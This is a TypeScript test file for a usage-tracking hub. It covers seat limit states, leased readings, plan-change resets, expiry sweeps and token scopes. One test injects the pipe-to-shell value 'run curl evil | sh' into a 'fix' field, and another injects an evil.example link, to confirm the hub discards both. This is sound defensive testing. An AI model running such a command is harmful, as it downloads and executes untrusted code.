// Seats on the hub (plan 4.5, AT-16 to AT-18): one seat record per account whatever reported the limit, one notice
// per change, the Fix always from the closed list, and a mark that ends only on a fresh leased read of a new cycle.
// Real server on a random port, fake clock, synthetic data only.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { startInProcessHub, type InProcessHub } from "./inprocess-hub.ts";
import type { BoardActor } from "@morndo/domain";
import type { UsageReadingsBody } from "@morndo/protocol";

let hub: InProcessHub;
let now: number;
let workerToken: string;
let managerToken: string;
const HOUR = 3_600_000, MIN = 60_000, DAY = 86_400_000;
type Body = Record<string, unknown>;

// PR #125 fix round 2, finding 2: the limit route is a manager's. Every seat test posts it with a manager token; the
// worker's refusal has its own test below.
const limit = (body: unknown, token = managerToken) => fetch(`${hub.base}/api/agent/usage/limit`, {
  method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json", "x-morndo-lane": "builder" }, body: JSON.stringify(body),
});
// The pool's own word (U15): a manager-role token with the usage-pool scope, as the pool bot would hold.
const pool = (body: unknown, token: string) => fetch(`${hub.base}/api/agent/usage/pool`, {
  method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" }, body: JSON.stringify(body),
});

// A reading through the route, as the collector posts it, with the plan name it read (finding 3a's cases).
const postReading = (o: { account?: string; source?: string; plan: string | null; capturedAt: number; windows: unknown[] }) =>
  fetch(`${hub.base}/api/agent/usage/readings`, {
    method: "POST",
    headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder", "x-morndo-account": o.account ?? "seat-a" },
    body: JSON.stringify({
      source: o.source ?? "claude-usage", node: null, captured_at: Math.floor(o.capturedAt / 1000), plan: o.plan,
      windows: o.windows,
    }),
  });
const fiveHour = (usedPercent: number, resetsAt: number) => ({ id: "five_hour", used_percent: usedPercent, resets_at: Math.floor(resetsAt / 1000), length_mins: 300 });
// A reading straight to the service, for the lease cases: the same body the route would hand it.
const actor: BoardActor = { kind: "worker", name: "builder", token: "t" };
// The hub's clock follows a reading's stamp (a source cannot have taken a reading after the hub's own now; the hub caps a stamp past its skew).
const read = (o: { account?: string; capturedAt: number; usedPercent: number; resetsAt: number; leaseId?: string | null; source?: UsageReadingsBody["source"] }) => {
  now = Math.max(now, o.capturedAt);
  const body: UsageReadingsBody = {
    source: o.source ?? "app-server", node: null, captured_at: Math.floor(o.capturedAt / 1000),
    windows: [{ id: "five_hour", used_percent: o.usedPercent, resets_at: Math.floor(o.resetsAt / 1000), length_mins: 300 }],
    ...(o.leaseId === undefined ? {} : { lease_id: o.leaseId }),
  };
  return hub.usage.reading(body, o.account ?? "seat-a", actor);
};
const viewOf = async () => {
  const cookie = await hub.cookie();
  return (await (await fetch(`${hub.base}/api/usage`, { headers: { cookie: `__Host-morndo=${cookie}` } })).json()) as Body;
};
const seatOf = async (account = "seat-a") => ((await viewOf()).accounts as Body[]).find(a => a.account === account)?.seat;
const noticesOf = async (kind: string) => ((await viewOf()).notices as Body[]).filter(n => n.kind === kind);

beforeEach(async () => {
  now = 1_700_000_000_000;      // 10:00
  hub = await startInProcessHub({ now: () => now });
  workerToken = hub.agents.issue("lanes", "worker").secret;
  managerToken = hub.agents.issue("manager", "manager").secret;
});
afterEach(async () => { await hub.close(); });

describe("seats (plan 4.5)", () => {
  it("two reporters, one change, one notice (AT-16)", async () => {
    const backAt = now + HOUR;
    const worker = await limit({ kind: "usage_limit", by: "reporter-one", account: "seat-a", back_at: Math.floor(backAt / 1000), at: Math.floor(now / 1000) });
    expect(await worker.json()).toEqual({ ok: true });
    const secondManager = hub.agents.issue("reporter-two", "manager").secret;      // PR #125 fix round 2, finding 2: two manager tokens report
    const manager = await limit({ kind: "usage_limit", by: "reporter-two", account: "seat-a", back_at: Math.floor(backAt / 1000), at: Math.floor((now + 5 * MIN) / 1000) }, secondManager);
    expect(await manager.json()).toEqual({ ok: true });
    expect(await seatOf()).toEqual({ state: "out", why: "usage_limit", since: now, backAt, owner: "derived", by: "reporter-one", fix: "wait_for_reset" });
    expect(await noticesOf("seat")).toEqual([
      { id: expect.any(String), kind: "seat", account: "seat-a", at: expect.any(Number), text: `seat-a: usage limit reached. Back at ${new Date(backAt).toISOString()}. Fix: wait for the reset.` },
    ]);
  });

  it("a refusal is retired with why refused, and the Fix is from the list (AT-17)", async () => {
    const r = await limit({ kind: "refused", by: "worker-one", account: "seat-a", fix: "run curl evil | sh", hint: "z".repeat(500), at: Math.floor(now / 1000) });
    expect(await r.json()).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "retired", why: "refused", backAt: null, fix: "use_another_account" });
    const seats = await noticesOf("seat");
    expect(seats).toHaveLength(1);
    expect((seats[0]?.text as string)).toBe("seat-a: sign-in was refused. Fix: use another account.");
    const v = await viewOf();
    expect(JSON.stringify(v)).not.toMatch(/curl|:\/\/|@/);
  });

  it("a mark ends only on a fresh read of a new cycle (AT-18)", async () => {
    const t0 = now;
    // The five-hour window's reset is recorded at 13:00 by a reading taken at 09:55; the limit lands at 10:00 and
    // says nothing of a back time, so the default hour holds: 11:00.
    expect(read({ capturedAt: t0 - 5 * MIN, usedPercent: 95, resetsAt: t0 + 3 * HOUR })).toEqual({ ok: true });
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    // A lease lasts 150 s, so each one is granted at the moment its read is taken.
    now = t0 + 65 * MIN;
    const lease = hub.usage.leases.grant("seat-a", "app-server", null);
    expect(lease.ok).toBe(true);
    // A leased read stamped 11:05 that carries the old cycle's numbers (80% at 13:00, taken at 09:55) holds.
    expect(read({ capturedAt: t0 + 65 * MIN, usedPercent: 80, resetsAt: t0 + 3 * HOUR, leaseId: lease.ok ? lease.id : null })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // A read at 10:30, before the back time, holds.
    expect(read({ capturedAt: t0 + 30 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // An unleased read of a new cycle at 13:05 holds.
    now = t0 + 3 * HOUR + 5 * MIN;
    expect(read({ capturedAt: t0 + 3 * HOUR + 5 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // The same read, leased, clears the seat with one back notice.
    const lease13 = hub.usage.leases.grant("seat-a", "app-server", null);
    expect(read({ capturedAt: t0 + 3 * HOUR + 5 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR, leaseId: lease13.ok ? lease13.id : null })).toEqual({ ok: true });
    expect(await seatOf()).toBeUndefined();
    expect(await noticesOf("back")).toEqual([
      { id: expect.any(String), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: back in use (a fresh reading shows a new cycle)." },
    ]);
    // A first-ever hit with no recorded cycle: the stale read still holds.
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: null, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    const leaseB = hub.usage.leases.grant("seat-b", "app-server", null);
    expect(read({ account: "seat-b", capturedAt: t0 + 65 * MIN, usedPercent: 80, resetsAt: t0 + 3 * HOUR, leaseId: leaseB.ok ? leaseB.id : null })).toEqual({ ok: true });
    expect(await seatOf("seat-b")).toMatchObject({ state: "out" });
  });

  it("an unknown limit changes no seat", async () => {
    expect(await limit({ kind: "unknown", by: "worker-one", account: "seat-a" })).toMatchObject({ status: 200 });
    expect(await limit({ kind: "usage_limit", by: "worker-one" })).toMatchObject({ status: 200 });      // no account at all
    const v = await viewOf();
    expect((v.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toBeUndefined();
    expect(await noticesOf("seat")).toEqual([]);
  });

  // S3 (plan 4.5 item 4): the fleet's taps and the pool's word.
  it("a lane's failure and a manager's limit post set the same seat state (AT-15)", async () => {
    hub.usage.fromFleet("pc", { kind: "lane_account", lane: "w1", account: "seat-a", at: now });   // PR #127, finding 1: the account is known and seen on the node before the hook's word counts
    hub.usage.fromFleet("pc", { kind: "failure", lane: "w1", window: "w1", error: "rate_limit", account: "seat-a", at: now });
    expect(await seatOf()).toMatchObject({ state: "out", why: "usage_limit", owner: "derived" });
    const managerToken = hub.agents.issue("manager", "manager").secret;
    const r = await limit({ kind: "usage_limit", by: "manager-one", account: "seat-a", at: Math.floor(now / 1000) }, managerToken);
    expect(await r.json()).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out", why: "usage_limit" });      // one seat, whatever reported it
    expect(await noticesOf("seat")).toHaveLength(1);
  });

  it("a pool-set state is sticky, a derived one clears, and authority is the token's (AT-43)", async () => {
    const poolToken = hub.agents.issue("pool", "manager", ["usage-pool"]).secret;
    const set = await pool({ account: "seat-a", action: "set", state: "retired", why: "refused", by: "pool-bot", at: Math.floor(now / 1000) }, poolToken);
    expect(await set.json()).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "retired", why: "refused", owner: "pool", by: "pool-bot" });
    // Sticky: a lane's limit failure under the pool's word changes nothing of what is shown. PR #127, finding 1: the
    // lane_account tap first, so seat-a is known and seen on the node and the failure's own word reaches resolution.
    hub.usage.fromFleet("pc", { kind: "lane_account", lane: "w1", account: "seat-a", at: now });
    hub.usage.fromFleet("pc", { kind: "failure", lane: "w1", window: "w1", error: "rate_limit", account: "seat-a", at: now + MIN });
    expect(await seatOf()).toMatchObject({ state: "retired", owner: "pool" });
    // A limit post that says "pool" on the limit route speaks only for the hub's own derived seat (PR #127, finding 2):
    // the pool's retired word still stands above whatever it derived underneath.
    const poolWord = await limit({ kind: "usage_limit", by: "pool", account: "seat-a", at: Math.floor((now + 2 * MIN) / 1000) });
    expect(poolWord.status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "retired", owner: "pool", by: "pool-bot" });
    // A derived one clears: a fresh leased read of a new cycle (AT-18's rule).
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    now += 65 * MIN;
    const lease = hub.usage.leases.grant("seat-b", "app-server", null);
    // A cycle begun at or after the mark (AT-18's rule): the read is 65 min past it, its 5-hour window reset 4 h out.
    expect(read({ account: "seat-b", capturedAt: now, usedPercent: 20, resetsAt: now + 4 * HOUR, leaseId: lease.ok ? lease.id : null })).toEqual({ ok: true });
    expect(await seatOf("seat-b")).toBeUndefined();
    // Authority is the token's: the scope, not the role — the manager's own token is refused without it.
    const managerToken = hub.agents.issue("manager", "manager").secret;
    const refused = await pool({ account: "seat-a", action: "cleared", by: "manager-one" }, managerToken);
    expect(refused.status).toBe(403);
    expect(await refused.json()).toEqual({ error: "scope_required" });
  });

  it("the pool's state wins on Home (AT-44)", async () => {
    const poolToken = hub.agents.issue("pool", "manager", ["usage-pool"]).secret;
    const set = await pool({ account: "seat-a", action: "set", state: "out", why: "usage_limit", back_at: Math.floor((now + HOUR) / 1000), by: "pool-bot", at: Math.floor(now / 1000) }, poolToken);
    expect(await set.json()).toEqual({ ok: true });
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });   // the hub's own derived mark
    expect(await seatOf()).toMatchObject({ state: "out", owner: "pool" });           // an equal state: the pool's
    now += 65 * MIN;
    const lease = hub.usage.leases.grant("seat-a", "app-server", null);
    expect(read({ capturedAt: now, usedPercent: 20, resetsAt: now + 3 * HOUR, leaseId: lease.ok ? lease.id : null })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out", owner: "pool" });           // the derived one cleared; the pool's stands
  });

  it("a plan change the plan watch tells drops the derived seat, with one reset notice; an unchanged plan leaves it (PR #125 finding 3a)", async () => {
    const reset = now + 2 * HOUR;
    const post = (plan: string | null, n: number, account = "seat-a") => postReading({ account, plan, capturedAt: now, windows: [fiveHour(20 + n, reset)] });
    // The plan watch's baseline and its agreement, on the plan the seat is marked under.
    expect((await post("Max 5x", 0)).status).toBe(200);
    now += MIN;
    expect((await post("Max 5x", 1)).status).toBe(200);
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    expect(await seatOf()).toMatchObject({ state: "out", owner: "derived" });
    // A different plan, told by two agreeing readings: the first only holds it.
    now += MIN;
    expect((await post("Max 20x", 2)).status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "out" });
    now += MIN;
    expect((await post("Max 20x", 3)).status).toBe(200);
    expect(await seatOf()).toBeUndefined();
    expect(await noticesOf("back")).toEqual([
      { id: expect.stringMatching(/^seat-a\|back\|reset\|\d+$/), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: the plan or account changed, so its earlier limit mark is dropped." },
    ]);
    // An unchanged plan tells nothing, so a seat under it stays.
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    const postB = (plan: string | null, n: number) => postReading({ account: "seat-b", plan, capturedAt: now, windows: [fiveHour(20 + n, reset)] });
    now += MIN;
    expect((await postB("Max 5x", 4)).status).toBe(200);
    now += MIN;
    expect((await postB("Max 5x", 5)).status).toBe(200);
    expect(await seatOf("seat-b")).toMatchObject({ state: "out", owner: "derived" });
    expect((await noticesOf("back")).filter(n => n.account === "seat-b")).toEqual([]);
  });

  it("by is untrusted display text: cleaned before it is stored, and never raw in a notice (PR #125 finding 3b)", async () => {
    const raw = `\u0001see https://evil.example/x mail a@b.example ${"k".repeat(155)}`;      // 200 characters: the wire's cap, before the hub cleans it to 40
    const told = await limit({ kind: "usage_limit", by: raw, account: "seat-a", at: Math.floor(now / 1000) });
    expect(await told.json()).toEqual({ ok: true });
    const v = await viewOf();
    expect((v.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toMatchObject({ by: `see mail ${"k".repeat(31)}` });
    expect(JSON.stringify(v)).not.toMatch(/evil|:\/\/|@/);      // the link, the address and the control character are gone whole
    // Cleaned to nothing, the reporter is "a source".
    expect(await limit({ kind: "refused", by: "https://x.example/ a@b.example", account: "seat-b", at: Math.floor(now / 1000) })).toMatchObject({ status: 200 });
    const again = await viewOf();
    expect((again.accounts as Body[]).find(a => a.account === "seat-b")?.seat).toMatchObject({ by: "a source" });
    expect(JSON.stringify(again)).not.toMatch(/evil|:\/\/|@/);
  });

  it("the limit route is a manager's: a worker token is refused 403 and nothing changes, a manager token's post is taken (PR #125 fix round 2, finding 2)", async () => {
    const refused = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-a", at: Math.floor(now / 1000) }, workerToken);
    expect(refused.status).toBe(403);
    expect(await refused.json()).toEqual({ error: "not_allowed" });
    const v = await viewOf();
    expect((v.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toBeUndefined();
    expect(await noticesOf("seat")).toEqual([]);
    const taken = await limit({ kind: "usage_limit", by: "manager-one", account: "seat-a", at: Math.floor(now / 1000) });
    expect(taken.status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "out", owner: "derived" });
  });

  it("the limit route is the pool's too: a worker token with the usage-pool scope is taken, one without it stays refused (PR #127, finding 2)", async () => {
    const poolWorker = hub.agents.issue("pool-bot", "worker", ["usage-pool"]).secret;
    const taken = await limit({ kind: "usage_limit", by: "pool-bot", account: "seat-a", at: Math.floor(now / 1000) }, poolWorker);
    expect(taken.status).toBe(200);
    expect(await taken.json()).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out", why: "usage_limit", owner: "derived", by: "pool-bot" });
    const refused = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-b", at: Math.floor(now / 1000) }, workerToken);
    expect(refused.status).toBe(403);
    expect(await refused.json()).toEqual({ error: "not_allowed" });
    expect(await seatOf("seat-b")).toBeUndefined();
  });

  it("a limit post speaks only for the hub's own derived seat: a pool-style cleared action changes nothing, a retired post by \"pool\" is derived (PR #127, finding 2)", async () => {
    // A pool-style clear posted to the limit route: the route has no clear, and the body names no limit kind.
    const cleared = await limit({ action: "cleared", by: "pool", account: "seat-a" });
    expect(cleared.status).toBe(400);
    expect(await seatOf()).toBeUndefined();
    expect(await noticesOf("seat")).toEqual([]);
    // A retired post with by "pool" from a manager token: the hub's own derived seat, shown as such.
    const retired = await limit({ kind: "refused", by: "pool", account: "seat-a", at: Math.floor(now / 1000) });
    expect(retired.status).toBe(200);
    expect(await seatOf()).toEqual({ state: "retired", why: "refused", since: now, backAt: null, owner: "derived", by: "pool", fix: "use_another_account" });
  });

  it("a derived out mark expires six hours past its back time, with one notice, and a newer limit post pushes that out (PR #127, finding 3b)", async () => {
    // One view per checkpoint: each cookie() call pairs a fresh device, and the default policy's sessions outlive
    // every clock jump here, so a view per seat and per notice list would hit the hub's six-device cap mid-test.
    const t0 = now;
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: t0 + HOUR, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    expect(await seatOf()).toMatchObject({ state: "out", backAt: t0 + HOUR });
    now = t0 + HOUR + 6 * HOUR - MIN;      // six hours less a minute past the back time: not yet
    hub.usage.sweep();
    const held = await viewOf();
    expect((held.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toMatchObject({ state: "out" });
    expect((held.notices as Body[]).filter(n => n.kind === "back" && n.account === "seat-a")).toEqual([]);
    now = t0 + HOUR + 6 * HOUR + MIN;      // a minute past the six hours: dropped, with one notice
    hub.usage.sweep();
    const dropped = await viewOf();
    expect((dropped.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toBeUndefined();
    expect((dropped.notices as Body[]).filter(n => n.kind === "back" && n.account === "seat-a")).toEqual([
      { id: expect.stringMatching(/^seat-a\|back\|expired\|\d+$/), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: its limit mark expired, the back time passed with no newer hit." },
    ]);
    // A newer limit post in between extends the back time, so the mark lives as long as its newest word says.
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: t0 + HOUR, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: t0 + 2 * HOUR, by: "worker-one", at: t0 + 30 * MIN })).toEqual({ ok: true, resolved: true });
    now = t0 + HOUR + 6 * HOUR + MIN;      // past the first back time, before the extended one: the mark stays
    hub.usage.sweep();
    const kept = await viewOf();
    expect((kept.accounts as Body[]).find(a => a.account === "seat-b")?.seat).toMatchObject({ state: "out", backAt: t0 + 2 * HOUR });
    expect((kept.notices as Body[]).filter(n => n.kind === "back" && n.account === "seat-b")).toEqual([]);
    now = t0 + 2 * HOUR + 6 * HOUR + MIN;
    hub.usage.sweep();
    const gone = await viewOf();
    expect((gone.accounts as Body[]).find(a => a.account === "seat-b")?.seat).toBeUndefined();
    expect((gone.notices as Body[]).filter(n => n.kind === "back" && n.account === "seat-b")).toEqual([
      { id: expect.stringMatching(/^seat-b\|back\|expired\|\d+$/), kind: "back", account: "seat-b", at: expect.any(Number), text: "seat-b: its limit mark expired, the back time passed with no newer hit." },
    ]);
  });

  // Fix round 2 on PR #127, finding 2: the cycle the limit hit is the clock the sweep expires a derived out mark by.
  // A weekly window resets days later than the default one-hour back time; the mark is not dropped while that window
  // still reads 100%, only six hours after its own reset.
  it("a derived out mark whose cycle resets days after its back time waits for the cycle's own reset (fix round 2, finding 2)", async () => {
    const t0 = now;
    // A reading of a five-hour-shaped weekly window at 100%, resetting three days out.
    expect((await postReading({ plan: "Max 5x", capturedAt: t0, windows: [fiveHour(100, t0 + 3 * DAY)] })).status).toBe(200);
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: t0 + HOUR, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    expect(hub.store.usageSeat("seat-a")?.record).toMatchObject({ state: "out", backAt: t0 + HOUR, cycleReset: t0 + 3 * DAY, windowId: "five_hour" });
    now = t0 + HOUR + 6 * HOUR + MIN;      // seven hours past the back time: the weekly window has not reset
    hub.usage.sweep();
    expect(await seatOf()).toMatchObject({ state: "out" });      // the mark stays: the window still reads 100%
    now = t0 + 3 * DAY + 6 * HOUR + MIN;   // six hours and a minute past the cycle's own reset: dropped, with one notice
    hub.usage.sweep();
    const dropped = await viewOf();
    expect((dropped.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toBeUndefined();
    expect((dropped.notices as Body[]).filter(n => n.kind === "back" && n.account === "seat-a")).toEqual([
      { id: expect.stringMatching(/^seat-a\|back\|expired\|\d+$/), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: its limit mark expired, the back time passed with no newer hit." },
    ]);
  });

  it("a plan change told by readings stamped after the mark drops it (PR #125 fix round 2, finding 1a)", async () => {
    const reset = now + 2 * HOUR;
    // The plan watch's baseline, on the plan the seat is marked under; the mark lands at 10:01.
    expect((await postReading({ plan: "Max 5x", capturedAt: now, windows: [fiveHour(20, reset)] })).status).toBe(200);
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: now + MIN })).toEqual({ ok: true, resolved: true });
    // Two readings stamped after the mark name another plan: the first only holds it, the second tells the change.
    now += 4 * MIN;
    expect((await postReading({ plan: "Max 20x", capturedAt: now - 2 * MIN, windows: [fiveHour(21, reset)] })).status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "out" });          // the first differing reading tells nothing
    expect((await postReading({ plan: "Max 20x", capturedAt: now - 1 * MIN, windows: [fiveHour(22, reset)] })).status).toBe(200);
    expect(await seatOf()).toBeUndefined();                          // the mark was made before the change was observed
    expect(await noticesOf("back")).toEqual([
      { id: expect.stringMatching(/^seat-a\|back\|reset\|\d+$/), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: the plan or account changed, so its earlier limit mark is dropped." },
    ]);
  });

  it("a plan change told by readings stamped before the mark does not drop it (PR #125 fix round 2, finding 1a)", async () => {
    const reset = now + 2 * HOUR;
    // The plan watch's baseline, then the mark lands at 10:05 — after the stamps of the readings that will tell the change.
    expect((await postReading({ plan: "Max 5x", capturedAt: now, windows: [fiveHour(20, reset)] })).status).toBe(200);
    const markAt = now + 5 * MIN;
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: markAt })).toEqual({ ok: true, resolved: true });
    // The hub's clock is past the mark when two readings stamped 10:03 and 10:04 name another plan.
    now = markAt + MIN;
    expect((await postReading({ plan: "Max 20x", capturedAt: markAt - 2 * MIN, windows: [fiveHour(21, reset)] })).status).toBe(200);
    expect((await postReading({ plan: "Max 20x", capturedAt: markAt - 1 * MIN, windows: [fiveHour(22, reset)] })).status).toBe(200);
    // The change is told, but the mark was made after the telling reading was taken: the seat stands.
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "plan")).toHaveLength(1);
    expect(await seatOf()).toMatchObject({ state: "out", why: "usage_limit", owner: "derived", backAt: markAt + HOUR });
    expect((await noticesOf("back")).filter(n => n.account === "seat-a")).toEqual([]);
  });

  it("the plan watch is per source: two steady sources tell no change and hold the seat; one source's own change tells once and drops it (PR #125 fix round 2, finding 1b)", async () => {
    const reset = now + 2 * HOUR;
    // A derived seat, marked before any reading.
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    // Two sources, each steady on its own plan: no plan change is told and the seat stands.
    now += MIN;
    expect((await postReading({ source: "app-server", plan: "A", capturedAt: now, windows: [fiveHour(21, reset)] })).status).toBe(200);
    now += MIN;
    expect((await postReading({ source: "app-server", plan: "A", capturedAt: now, windows: [fiveHour(22, reset)] })).status).toBe(200);
    now += MIN;
    expect((await postReading({ source: "cli-screen", plan: "B", capturedAt: now, windows: [fiveHour(23, reset)] })).status).toBe(200);
    now += MIN;
    expect((await postReading({ source: "cli-screen", plan: "B", capturedAt: now, windows: [fiveHour(24, reset)] })).status).toBe(200);
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "plan")).toEqual([]);
    expect(await seatOf()).toMatchObject({ state: "out", owner: "derived" });
    // One source changing its own plan, told by two agreeing readings: told once, and the seat marked before it drops.
    now += MIN;
    expect((await postReading({ source: "app-server", plan: "B", capturedAt: now, windows: [fiveHour(25, reset)] })).status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "out" });          // the first differing reading tells nothing
    now += MIN;
    expect((await postReading({ source: "app-server", plan: "B", capturedAt: now, windows: [fiveHour(26, reset)] })).status).toBe(200);
    expect(await seatOf()).toBeUndefined();
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "plan")).toEqual([
      { id: expect.any(String), kind: "plan", account: "seat-a", at: expect.any(Number), text: 'seat-a: plan changed from "A" to "B".' },
    ]);
  });
});
